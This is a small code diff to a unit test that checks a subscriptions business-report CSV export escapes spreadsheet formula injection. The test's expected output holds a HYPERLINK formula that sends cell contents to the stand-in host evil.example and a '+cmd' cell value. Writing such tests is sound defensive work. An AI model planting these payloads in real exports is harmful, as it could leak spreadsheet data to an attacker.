@@ -23,7 +23,7 @@ describe('SubscriptionsController business report CSV', () => {
     const controller = new SubscriptionsController(service as never);
     const res = { setHeader: vi.fn() };
 
-    const csv = (await controller.businessReport('ws-1', 'csv', res as never)) as string;
+    const csv = (await controller.businessReport('ws-1', { format: 'csv' }, res as never)) as string;
 
     expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")","'+cmd",10.00`);
   });
